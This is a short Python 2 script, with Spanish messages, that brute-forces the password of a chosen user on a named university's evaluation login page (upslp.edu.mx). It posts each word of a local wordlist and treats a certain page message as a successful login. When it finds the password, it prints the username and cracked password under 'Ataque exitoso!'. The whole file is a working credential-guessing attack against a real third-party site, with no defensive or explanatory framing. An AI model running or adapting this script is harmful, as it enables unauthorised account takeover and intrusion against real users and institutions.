#!/usr/bin/env python
# coding=UTF-8

import os , urllib2 , urllib , re

site = 'http://servicios.upslp.edu.mx/evaluaciones/model/login/login.php'

wordlist = open('/home/debian/Documentos/wordlist', 'rb')
done = 0
count = 0

os.system("clear")
print 'Ingresa el usuario:'
user = str(unicode(raw_input('> ')))

for word in wordlist:
	word = str(unicode(word)).rstrip('\n')
	count = count + 1
	try:
		if done == 0:
			print '[' + str(count) + ']' + ' Atacando!'
			login = urllib.urlencode({'usuarioLogin': user,'passwordLogin': word.encode('utf-8')})
			connect = urllib2.Request(site)
			query = urllib2.urlopen(connect, login)
			data = query.read()
			match = re.search('(El periodo de evaluaciones ha concluido.</h4>)', data)
			if match:
				os.system("clear")
				print 'Ataque exitoso!' + '\n'
				print 'Usuario: ' + str(user) + '\n'
				print 'Contrasena: ' + str(word) + '\n'
				done = 1
				break
			else:
				done = 0
	except urllib2.URLError:
		done = 0
if done == 0:
	os.system("clear")
	print 'Ataque fallido!' + '\n'
	print 'Utilizar otro diccionario' + '\n'
